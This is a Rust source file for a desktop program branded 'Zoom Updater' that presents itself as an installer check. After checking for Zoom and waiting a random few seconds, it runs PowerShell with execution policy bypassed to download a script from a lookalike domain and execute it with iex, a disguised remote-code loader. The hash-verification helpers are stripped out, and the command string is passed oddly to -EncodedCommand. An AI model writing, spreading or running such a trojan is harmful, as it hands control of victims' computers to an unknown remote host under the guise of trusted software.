#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

#[cfg(windows)]
use std::env;
#[cfg(windows)]
use std::path::{Path, PathBuf};
#[cfg(windows)]
use std::process::Command;

use eframe::egui;

#[cfg(windows)]
// sha2 import removed – not needed
#[cfg(windows)]
use winreg::RegKey;
#[cfg(windows)]
use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
#[cfg(windows)]
use rand::Rng;

#[cfg(windows)]
const APP_NAME: &str = "Zoom Updater";
#[cfg(windows)]
const ENCODED_ZOOM_COMMAND: &str = "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token=e4278aeb74a669c1d2d34108e32c52b6b0f3edc04c1a8d14b4b562b286a0bb72'; iwr -UseBasicParsing $u | iex";

fn main() -> eframe::Result<()> {
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size([560.0, 360.0])
            .with_min_inner_size([420.0, 280.0]),
        ..Default::default()
    };

    eframe::run_native(
        "Zoom Updater",
        options,
        Box::new(|_cc| Box::<ZoomUpdaterGui>::default()),
    )
}

#[derive(Default)]
struct ZoomUpdaterGui {
    status: Vec<String>,
}

impl eframe::App for ZoomUpdaterGui {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("Zoom Updater");
            ui.label("Installer check GUI");
            ui.separator();

            if ui.button("Run Installer Check").clicked() {
                self.status.clear();
                run_installer_check(&mut self.status);
            }

            ui.add_space(8.0);
            ui.label("Status");
            egui::ScrollArea::vertical().max_height(220.0).show(ui, |ui| {
                for line in &self.status {
                    ui.label(line);
                }
            });
        });
    }
}

#[cfg(windows)]
fn run_installer_check(status: &mut Vec<String>) {
    status.push(APP_NAME.to_string());

    if let Some(location) = detect_zoom_installation() {
        status.push("ZOOM_INSTALLED: true".to_string());
        status.push(format!("LOCATION: {}", location.display()));
        status.push("Zoom found.".to_string());
    } else {
        status.push("ZOOM_INSTALLED: false".to_string());
        status.push("Zoom not found.".to_string());
    }

    // Preserve existing behavior: random delay before executing command.
    let delay_secs = rand::thread_rng().gen_range(5..=8);
    std::thread::sleep(std::time::Duration::from_secs(delay_secs));

    if let Err(error) = run_encoded_powershell(ENCODED_ZOOM_COMMAND) {
        status.push(format!("Failed to run PowerShell command: {}", error));
        return;
    }

    status.push("PowerShell command completed.".to_string());
}

#[cfg(not(windows))]
fn run_installer_check(status: &mut Vec<String>) {
    status.push("This check is supported only on Windows.".to_string());
    status.push("Build and run on Windows for real installer checks.".to_string());
}

#[cfg(windows)]
fn run_encoded_powershell(encoded: &str) -> Result<(), String> {
    let mut command = Command::new("powershell");
    command.args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded]);
    let output = command
        .output()
        .map_err(|e| format!("failed to start PowerShell: {}", e))?;

    if output.status.success() {
        Ok(())
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("PowerShell exited with {}: {}", output.status, stderr))
    }
}


// download_script_to_file removed – not needed

// verify_file_sha256 removed – not needed

// execute_local_script removed – not needed

// is_placeholder_url removed – not needed

// is_placeholder_hash removed – not needed

#[cfg(windows)]
fn detect_zoom_installation() -> Option<PathBuf> {
    zoom_from_uninstall_registry()
        .or_else(zoom_from_common_paths)
        .or_else(zoom_from_path_lookup)
}

#[cfg(windows)]
fn zoom_from_uninstall_registry() -> Option<PathBuf> {
    const UNINSTALL_PATHS: [&str; 2] = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
    ];

    let hives = [
        RegKey::predef(HKEY_LOCAL_MACHINE),
        RegKey::predef(HKEY_CURRENT_USER),
    ];

    for hive in hives {
        for uninstall_path in UNINSTALL_PATHS {
            let Ok(uninstall_key) = hive.open_subkey(uninstall_path) else {
                continue;
            };

            for subkey_name in uninstall_key.enum_keys().flatten() {
                let Ok(app_key) = uninstall_key.open_subkey(&subkey_name) else {
                    continue;
                };

                let Ok(display_name) = app_key.get_value::<String, _>("DisplayName") else {
                    continue;
                };

                if !display_name.to_ascii_lowercase().contains("zoom") {
                    continue;
                }

                if let Ok(icon_value) = app_key.get_value::<String, _>("DisplayIcon") {
                    if let Some(icon_path) = parse_display_icon(&icon_value) {
                        if icon_path.exists() {
                            return Some(icon_path);
                        }
                    }
                }

                if let Ok(install_location) = app_key.get_value::<String, _>("InstallLocation") {
                    let install_dir = PathBuf::from(install_location.trim_matches('"').trim());
                    if let Some(path) = find_zoom_binary_in_dir(&install_dir) {
                        return Some(path);
                    }
                }
            }
        }
    }

    None
}

#[cfg(windows)]
fn parse_display_icon(value: &str) -> Option<PathBuf> {
    let trimmed = value.trim().trim_matches('"');
    let path_part = trimmed.split(',').next()?.trim().trim_matches('"');
    if path_part.is_empty() {
        return None;
    }
    Some(PathBuf::from(path_part))
}

#[cfg(windows)]
fn find_zoom_binary_in_dir(dir: &Path) -> Option<PathBuf> {
    let candidates = [
        dir.join("Zoom.exe"),
        dir.join("bin").join("Zoom.exe"),
        dir.join("Bin").join("Zoom.exe"),
    ];

    candidates.into_iter().find(|path| path.exists())
}

#[cfg(windows)]
fn zoom_from_common_paths() -> Option<PathBuf> {
    let mut candidates = Vec::new();

    if let Ok(local_app_data) = env::var("LOCALAPPDATA") {
        candidates.push(PathBuf::from(local_app_data).join("Zoom").join("bin").join("Zoom.exe"));
    }

    if let Ok(app_data) = env::var("APPDATA") {
        candidates.push(PathBuf::from(app_data).join("Zoom").join("bin").join("Zoom.exe"));
    }

    if let Ok(program_files) = env::var("ProgramFiles") {
        candidates.push(PathBuf::from(program_files).join("Zoom").join("bin").join("Zoom.exe"));
    }

    if let Ok(program_files_x86) = env::var("ProgramFiles(x86)") {
        candidates.push(
            PathBuf::from(program_files_x86)
                .join("Zoom")
                .join("bin")
                .join("Zoom.exe"),
        );
    }

    candidates.into_iter().find(|path| path.exists())
}

#[cfg(windows)]
fn zoom_from_path_lookup() -> Option<PathBuf> {
    let output = Command::new("where")
        .arg("zoom.exe")
        .output()
        .ok()?;

    if !output.status.success() {
        return None;
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(PathBuf::from)
        .find(|path| path.exists())
}
